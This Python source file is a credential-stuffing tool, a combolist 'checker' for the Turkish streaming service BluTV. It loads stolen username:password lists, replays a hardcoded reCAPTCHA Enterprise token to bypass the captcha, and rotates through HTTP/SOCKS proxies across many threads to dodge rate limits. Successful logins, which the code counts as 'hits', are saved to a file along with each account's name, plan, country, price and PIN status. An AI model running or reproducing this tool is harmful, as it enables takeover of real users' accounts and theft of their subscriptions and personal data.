try:
    import os, requests, colorama, threading, time, urllib, tkinter
except ImportError:
    input("Error while importing modules. Please install the modules in requirements.txt")
    exit()

colorama.init(convert=True)    

lock = threading.Lock()
counter = 0
costumcounter = 0
failcounter = 0
errorcounter = 0
proxyfilelines = 0
proxies = []
proxy_counter = 0
combolist = []
combolist_counter = 0
modulename = "Blutv"
moduleowner = "ESU"


class blutv:
    def __init__(self, combolist = None, proxytype = None,  proxy = None):
        self.session = requests.Session()        
        self.proxy = proxy
        self.proxytype = proxytype
        self.combolist = combolist
        self.username, self.password = self.combolist.split(":")
        
    def recaptchabypass(self):
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"            
        }
        try:
            r = requests.post("https://www.google.com/recaptcha/enterprise/reload?k=6LfMq3sbAAAAAIhVxgwqrHZ4VRTBciqGUDOxvWYo", headers = headers, data = "v=gWN_U6xTIPevg0vuq7g1hct0&reason=q&c=03ANYolqs288zQOaOE_ghNitDsN4yGIwm0VmGiA6u0r6cry6tYtOo7cq4EHM0x4l3x5mbkAdbvFVT0tmoQY7CesutJPkWK6tDQfxPeA6a8BwmcqPDmQcleesRA-zK7hl5jHerRj1-VrxaqqN8jueM6c0B_G0TWbIu5lA1Hhqyzn-DTxX6DIVmb4pNNTpwjczuxtRi3dGTuTYVQXaKySinbjfoIWKmLXPsYQdcVxkwrqoDEeDzYCXScwK9sVHuUM7S6vKso1wOsIX31BGESOTrWX5B6jkI3NEwoya6gZ0SR74Kq422xr_-e_F2MXCXjNP9vfE3pMtbzw-UM0DKPWxF9HfhINI7raaD4LXPBAc0gouX8XAkkfHqGgXQTZC37kFTMlS3xt2UdxIQuSpVj4WiFBhIMzypx7Re-ejcI9qpivDTCTcuYc9ukmvrcAHTgptTi653cv5_UiHMkokaE4O7E2If4LLYSK7Ms0ZnLwys4IcVmwzRLI_S63saU034wzxF1gjrZ_DSR9yYUOfldSgCTNLu2g2e_I4xbRSzWn49wg5QfRkvuJLGpGu0fLXz13hm2AXpavlNuOGmBzNASjADdMyVLOLlWE21lluJL4OKGh5NeCoMbk6frFgElpUsFl_FBGNvCRDZl1NXTMdeoimWISwEtCvKahsfZ3ujVeFG5GhCx-E3f2DSSgFOL8YM_hUC3L2Ck-mNUtGyVKvhzKo3d2r-h-5v5tmmcAkBOj39yMbWsul8P5cE02g_1RGlMYFkb2KbgcLah66AIfBebSgLsNz3pyGUYfmVV2eOTm7tUcxYB4JIaI39zpPhugFHA9VJPdzS_LhocRxL1N6N0lkRwWGGINpd69TzLJTBm5L5n6n8AViVeWVampOHPDmRYXoswJFDgafaL3-4EmBc11_AXK4dIew8insr779d7zRObaunDg-zD96o8vgysWIo0KezZf6dmAOaMMUwegiaMF75Uu3_zkQWEXMjGUbG-MgMRUqO79tzm96E0SDJ3TEi4272BPBP0PFnd97p4hektLD7vkuRjph_G3a6BOjMDUKMYYmG5ozKDrZ43_tfSOuMWXwxGtHblpFMfz_6DgO2GggFbT977xXu8DNztNp7iGBSG_gtlOlNW49mZvx35C6FSYWblvpOgKiOyC1qYtmcpnEu_qlbfG5-ZPmul-MomAeqr3Iw80AooLAV6PBBveyuuOQ6ebCA74xlhEingytaWG1BHV2a-_2ImTHxlgqGhAKX8ZeHSXnhps8gIaX1OUbY2fWPUDCRTn0I8OYknd8tut5z0h3QhY3BvRBm-UHl_9AjMF3SpuOfsUW2iLUpGHpGwtGLJgA0zTMERLSEdfxSjetge_8QZX6pO1YrNFkzzDMzhru4jajP0unwuZXTnpX2LHMsfh8xsvUGNmQS-FATar7-bU6ZbER-7FP6UqR9qVZWp0Fo0ZNGXWE0yBTw&k=6LfMq3sbAAAAAIhVxgwqrHZ4VRTBciqGUDOxvWYo&co=aHR0cHM6Ly93d3cuYmx1dHYuY29tOjQ0Mw..&hl=tr&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySd")
            return r.text.split('rresp","')[1].split('"')[0]
        except:    
            return None
        
    def blutvrequiredgetuserip(self):
        proxies = None
        if self.proxy != None:
            if self.proxytype == 1:
                proxies = {"http": f"http://{self.proxy}","https": f"http://{self.proxy}"}
            if self.proxytype == 2:
                proxies = {"http": f"socks4://{self.proxy}","https": f"socks4://{self.proxy}"}
            if self.proxytype == 3:
                proxies = {"http": f"socks5://{self.proxy}","https": f"socks5://{self.proxy}"}        
                
        headers= {
            "referer": "https://www.blutv.com/int/giris" ,
            "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"" ,
            "sec-fetch-dest": "empty" ,
            "sec-fetch-mode": "cors" ,
            "sec-fetch-site": "same-origin" ,
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
        }                
        try:
            r = requests.get("https://www.blutv.com/actions/account/getuserip", headers=headers, proxies=proxies)  
            return r.text.split('"ip": "')[1].split('",')[0]
        except:
            return None
    def capture(self):
        proxies = None
        if self.proxy != None:
            if self.proxytype == 1:
                proxies = {"http": f"http://{self.proxy}","https": f"http://{self.proxy}"}
            if self.proxytype == 2:
                proxies = {"http": f"socks4://{self.proxy}","https": f"socks4://{self.proxy}"}
            if self.proxytype == 3:
                proxies = {"http": f"socks5://{self.proxy}","https": f"socks5://{self.proxy}"}        
                
        headers= {
            "referer": "https://www.blutv.com/int/giris" ,
            "sec-ch-ua": "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"" ,
            "sec-fetch-dest": "empty" ,
            "sec-fetch-mode": "cors" ,
            "sec-fetch-site": "same-origin" ,
            "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36"
        }
                
        try:
            r = self.session.get("https://www.blutv.com/int/hesabim", headers = headers ,proxies = proxies)
            name = r.text.split('","name":"')[1].split('","')[0]
            variant = r.text.split('variant_name":"')[1].split('","')[0]
            country = r.text.split('country":"')[1].split('","')[0]
            price = r.text.split('price":')[1].split(',"')[0]
            pin = r.text.split('hasPin":')[1].split(',"')[0]
            return name, variant, country, price, pin
        except:
            return None
    def checker(self):
        recaptchatoken = self.recaptchabypass()
        ip = self.blutvrequiredgetuserip()
        if recaptchatoken == None:
            return None, "while getting recaptchatoken", None
        if ip == None:
             return None, "while getting blutv required user ip", None

        proxies = None
        if self.proxy != None:
            if self.proxytype == 1:
                proxies = {"http": f"http://{self.proxy}","https": f"http://{self.proxy}"}
            if self.proxytype == 2:
                proxies = {"http": f"socks4://{self.proxy}","https": f"socks4://{self.proxy}"}
            if self.proxytype == 3:
                proxies = {"http": f"socks5://{self.proxy}","https": f"socks5://{self.proxy}"}
                    
        headers = {
            "Content-Type":"text/plain;charset=UTF-8",
            "deviceresolution": "400x570" ,
            "origin": "https://www.blutv.com" ,
            "referer": "https://www.blutv.com/int/giris" ,
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36" ,
            "userip": ip
        }
        
        data = {
            "remember":"False",
            "username":self.username,
            "password":self.password,
            "captchaVersion":"v3",
            "captchaToken":recaptchatoken
            } 
        
        try:
            r = self.session.post("https://www.blutv.com/api/login", headers=headers, json=data, proxies=proxies)
            if 'accessToken' in r.text:
                script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
                rel_path = "../../../EXPORTS/blutv.txt"
                dir = os.path.join(script_dir, rel_path)                
                name, variant, country, price, pin = self.capture()
                if self.capture != None:               
                    with open(dir, "a") as f:
                        f.write(self.combolist + "\n> Name: " + name + "\n> Pack: " + variant + "\n> Country: " + country + "\n> Price: " + price + " ₺" + "\n> Pin Status: " + pin + ""+ "\n")   
                        return True, self.combolist, "Hit"
                else:
                    with open(dir, "a") as f:
                        f.write(self.combolist + "\n")                                                            
                    return True, self.combolist, "Hit"
            elif 'errors.wrongUsernameOrPassword' in r.text:
                return False, self.combolist, None
            elif '403 Forbidden' in r.text:
                return None, "while retries, ratelimit", None
            else:
                return None, "unknown error", None
        except:
            return None, "while retries", None
        
        
os.system(f"title {modulename} by {moduleowner}")   

threads = int(input(f"\n[{modulename}] Threads > "))
print("\n[1] Proxies\n[2] Get Free Proxies(Maybe you get bad proxies)\n[3] Proxyless")
proxyinput = int(input(f"\n[{modulename}] Select Preference > "))

if proxyinput == 1:
    print("\n[1] Http\n[2] Socks4\n[3] Socks5")
    proxytype = int(input(f"\n[{modulename}] Select Proxy Type > "))
if proxyinput == 2:
    print("\n[1] Http\n[2] Socks4\n[3] Socks5")
    proxytype = int(input(f"\n[{modulename}] Select Proxy Type > "))    
os.system("cls")

script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
rel_path = "../../../proxies.txt"
proxiesdir = os.path.join(script_dir, rel_path)
           
def load_proxies():
        global proxyfilelines
        if not os.path.exists(proxiesdir):
            print(colorama.Fore.YELLOW + "\nFile proxies.txt not found")
            time.sleep(5)
            os._exit(0)
        with open(proxiesdir, "r", encoding = "UTF-8") as f:
            for line in f.readlines():
                line = line.replace("\n", "")
                proxyfilelines = len(proxies)
                proxyfilelines += 1
                proxies.append(line)            
            if not len(proxies):
                print(colorama.Fore.YELLOW + "\nNo proxies loaded in proxies.txt")
                time.sleep(5)
                os._exit(0)

def load_combo():
    import tkinter as tk
    from tkinter import filedialog

    root = tk.Tk()
    root.withdraw()
    combolistpath = filedialog.askopenfilename(filetypes=[('.txtfiles','.txt')],title='Select Combolist')
    
    if not os.path.exists(combolistpath):
        print(colorama.Fore.YELLOW + "\nFile not found")
        time.sleep(5)
        os._exit(0)
    with open(combolistpath, "r", encoding = "ISO-8859-1") as f:
        for line in f.readlines():
            line = line.replace("\n", "")
            combolist.append(line)            
        if not len(combolist):
                print(colorama.Fore.YELLOW + "\nNo combo loaded in your combolist file")
                time.sleep(5)
                os._exit(0)

    

def getfreeproxy():
    if proxytype == 1:
       # HTTP Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)
    if proxytype == 2:
       # Socks4 Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)
    if proxytype == 3:           
       # Socks5 Proxies
       urllib.request.urlretrieve("https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all", proxiesdir)

if proxyinput == 2:
        getfreeproxy()
        time.sleep(1)
        load_proxies()
        load_combo()
elif proxyinput == 1:
        load_proxies()
        load_combo()
else:
    load_combo()
    
def safe_print(arg):
        lock.acquire()
        print(arg)
        lock.release()

def count():
        os.system(f'title [{modulename} by {moduleowner}] Hit = {counter} / Costum = {costumcounter} / Fail = {failcounter} / Error = {errorcounter} / Proxy = {proxyfilelines}')

def thread_starter():
        global counter, errorcounter, costumcounter, failcounter
        if proxyinput == 1:
            obj = blutv(combolist[combolist_counter], proxytype, proxies[proxy_counter])
        if proxyinput == 2:
            obj = blutv(combolist[combolist_counter], proxytype, proxies[proxy_counter])
        else:
            obj = blutv(combolist[combolist_counter])
        result, message, status = obj.checker()
        if result == True:        
            if status == "Hit":
                counter += 1
                safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.GREEN + "HIT " + colorama.Fore.RESET + message + colorama.Fore.RESET)
                count()
            elif status == "Costum":
                costumcounter += 1
                safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.YELLOW + "Costum " + colorama.Fore.RESET + message + colorama.Fore.RESET)
                count()
        elif result == False:
                failcounter += 1
                safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.RED + "Fail " + colorama.Fore.RESET + message + colorama.Fore.RESET)
                count()
        else:
            errorcounter += 1
            safe_print(colorama.Fore.MAGENTA + f"[{modulename}] " + colorama.Fore.RED + f"Error {message}" + colorama.Fore.RESET)
            count()
            
while True:
        if threading.active_count() <= threads:
            try:
                threading.Thread(target = thread_starter).start()
                proxy_counter += 1
                combolist_counter += 1
            except:
                pass
            if len(proxies) <= proxy_counter: #Loops through proxy file
                proxy_counter = 0
            if len (combolist) <= combolist_counter:
                combolist_counter = 0